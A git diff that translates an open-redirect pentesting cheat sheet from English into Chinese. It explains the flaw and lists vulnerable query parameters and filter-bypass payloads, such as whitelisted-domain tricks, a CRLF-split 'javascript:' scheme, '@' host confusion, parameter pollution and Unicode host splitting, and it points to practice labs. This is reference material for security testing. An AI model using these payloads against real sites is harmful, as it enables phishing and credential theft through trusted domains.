@@ -1,69 +1,72 @@
-# Open URL Redirect
+[原文文档](README.en.md)
 
-> Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.
+# 开放URL重定向
 
-## Summary
+> 当Web应用程序接受可能导致Web应用程序重定向请求到包含在不受信任输入中的URL的不受信任输入时，可能发生未验证的重定向和转发。通过修改不受信任的URL输入为恶意站点，攻击者可能成功发起钓鱼诈骗并窃取用户凭据。由于修改后的链接中的服务器名称与原始站点相同，钓鱼尝试可能具有更值得信赖的外观。未验证的重定向和转发攻击也可用于恶意制作通过应用程序访问控制检查然后将攻击者转发到他们通常无法访问的特权功能的URL。
 
-* [Methodology](#methodology)
-    * [HTTP Redirection Status Code](#http-redirection-status-code)
-    * [Redirect Methods](#redirect-methods)
-        * [Path-based Redirects](#path-based-redirects)
-        * [JavaScript-based Redirects](#javascript-based-redirects)
-        * [Common Query Parameters](#common-query-parameters)
-    * [Filter Bypass](#filter-bypass)
-* [Labs](#labs)
-* [References](#references)
+## 摘要
 
-## Methodology
+* [方法论](#methodology)
+    * [HTTP重定向状态码](#http-redirection-status-code)
+    * [重定向方法](#redirect-methods)
+        * [基于路径的重定向](#path-based-redirects)
+        * [基于JavaScript的重定向](#javascript-based-redirects)
+        * [常见查询参数](#common-query-parameters)
+    * [过滤器绕过](#filter-bypass)
+* [实验环境](#labs)
+* [参考资料](#references)
 
-An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.
+## 方法论
 
-Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.
+当Web应用程序或服务器使用未验证的、用户提供的输入来重定向用户到其他站点时，就会发生开放重定向漏洞。这允许攻击者制作一个指向易受攻击站点的链接，该链接重定向到他们选择的恶意站点。
 
-**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:
+攻击者可以利用此漏洞进行钓鱼活动、窃取会话或强制用户未经同意执行操作。
+
+**示例**：一个Web应用程序有一个功能，允许用户点击链接并自动重定向到保存的首选主页。这可能像这样实现：
 
 ```ps1
 https://example.com/redirect?url=https://userpreferredsite.com
 ```
 
-An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.
+攻击者可以通过将`userpreferredsite.com`替换为指向恶意网站的链接来利用这里的开放重定向。然后他们可以在钓鱼电子邮件或另一个网站上分发此链接。当用户点击链接时，他们会被带到恶意网站。
 
-## HTTP Redirection Status Code
+## HTTP重定向状态码
 
-HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:
+HTTP重定向状态码，以3开头的，表示客户端必须采取额外操作来完成请求。以下是一些最常见的：
 
-* [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
-* [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
-* [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
-* [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
-* [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
-* [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header.
-* [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
-* [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.
+* [300 多种选择](https://httpstatuses.com/300) - 这表示请求有多个可能的响应。客户端应该选择其中一个。
+* [301 永久移动](https://httpstatuses.com/301) - 这意味着请求的资源已永久移动到Location头中给出的URL。所有未来请求都应使用新的URI。
+* [302 发现](https://httpstatuses.com/302) - 此响应代码意味着请求的资源已临时移动到Location头中给出的URL。与301不同，它并不意味着资源已永久移动，只是它临时位于其他地方。
+* [303 查看其他](https://httpstatuses.com/303) - 服务器发送此响应以指示客户端使用GET请求在另一个URI处获取请求的资源。
+* [304 未修改](https://httpstatuses.com/304) - 这用于缓存目的。它告诉客户端响应未被修改，因此客户端可以继续使用相同缓存的响应版本。
+* [305 使用代理](https://httpstatuses.com/305) - 请求的资源必须通过Location头中提供的代理访问。
+* [307 临时重定向](https://httpstatuses.com/307) - 这意味着请求的资源已临时移动到Location头中给出的URL，未来请求仍应使用原始URI。
+* [308 永久重定向](https://httpstatuses.com/308) - 这意味着资源已永久移动到Location头中给出的URL，未来请求应使用新的URI。它类似于301，但不允许HTTP方法更改。
 
-## Redirect Methods
+## 重定向方法
 
-### Path-based Redirects
+### 基于路径的重定向
 
-Instead of query parameters, redirection logic may rely on the path:
+重定向逻辑可能依赖于路径而不是查询参数：
 
-* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
-* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`
+* 在URL中使用斜杠：`https://example.com/redirect/http://malicious.com`
 
-### JavaScript-based Redirects
+* 注入相对路径：`https://example.com/redirect/../http://malicious.com`
 
-If the application uses JavaScript for redirects, attackers may manipulate script variables:
+### 基于JavaScript的重定向
 
-**Example**:
+如果应用程序使用JavaScript进行重定向，攻击者可能操作脚本变量：
+
+**示例**：
 
 ```js
 var redirectTo = "http://trusted.com";
 window.location = redirectTo;
 ```
 
-**Payload**: `?redirectTo=http://malicious.com`
+**载荷**：`?redirectTo=http://malicious.com`
 
-### Common Query Parameters
+### 常见查询参数
 
 ```powershell
 ?checkout_url={payload}
@@ -89,93 +92,93 @@ window.location = redirectTo;
 /redirect/{payload}
 ```
 
-## Filter Bypass
+## 过滤器绕过
 
-* Using a whitelisted domain or keyword
+* 使用列入白名单的域名或关键字
 
     ```powershell
-    www.whitelisted.com.evil.com redirect to evil.com
+    www.whitelisted.com.evil.com 重定向到 evil.com
     ```
 
-* Using **CRLF** to bypass "javascript" blacklisted keyword
+* 使用**CRLF**绕过"javascript"黑名单关键字
 
     ```powershell
     java%0d%0ascript%0d%0a:alert(0)
     ```
 
-* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
+* 使用"`//`"和"`////`"绕过"http"黑名单关键字
 
     ```powershell
     //google.com
     ////google.com
     ```
 
-* Using "https:" to bypass "`//`" blacklisted keyword
+* 使用"https:"绕过"`//`"黑名单关键字
 
     ```powershell
     https:google.com
     ```
 
-* Using "`\/\/`" to bypass "`//`" blacklisted keyword
+* 使用"`\/\/`"绕过"`//`"黑名单关键字
 
     ```powershell
     \/\/google.com/
     /\/google.com/
     ```
 
-* Using "`%E3%80%82`" to bypass "." blacklisted character
+* 使用"`%E3%80%82`"绕过"."黑名单字符
 
     ```powershell
     /?redir=google。com
     //google%E3%80%82com
     ```
 
-* Using null byte "`%00`" to bypass blacklist filter
+* 使用空字节"`%00`"绕过黑名单过滤器
 
     ```powershell
     //google%00.com
     ```
 
-* Using HTTP Parameter Pollution
+* 使用HTTP参数污染
 
     ```powershell
     ?next=whitelisted.com&next=google.com
     ```
 
-* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
+* 使用"@"字符。[常见Internet方案语法](https://datatracker.ietf.org/doc/html/rfc1738)
 
     ```powershell
     //<user>:<password>@<host>:<port>/<url-path>
     http://www.theirsite.com@yoursite.com/
     ```
 
-* Creating folder as their domain
+* 创建文件夹作为他们的域名
 
     ```powershell
     http://www.yoursite.com/http://www.theirsite.com/
     http://www.yoursite.com/folder/www.folder.com
     ```
 
-* Using "`?`" character, browser will translate it to "`/?`"
+* 使用"?"字符，浏览器会将其翻译为"`/?`"
 
     ```powershell
     http://www.yoursite.com?http://www.theirsite.com/
     http://www.yoursite.com?folder/www.folder.com
     ```
 
-* Host/Split Unicode Normalization
+* 主机/分割Unicode规范化
 
     ```powershell
     https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
     http://a.com／X.b.com
     ```
 
-## Labs
+## 实验环境
 
-* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
-* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
+* [Root Me - HTTP - 开放重定向](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
+* [PortSwigger - 基于DOM的开放重定向](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 
-## References
+## 参考资料
 
 * [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
 * [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
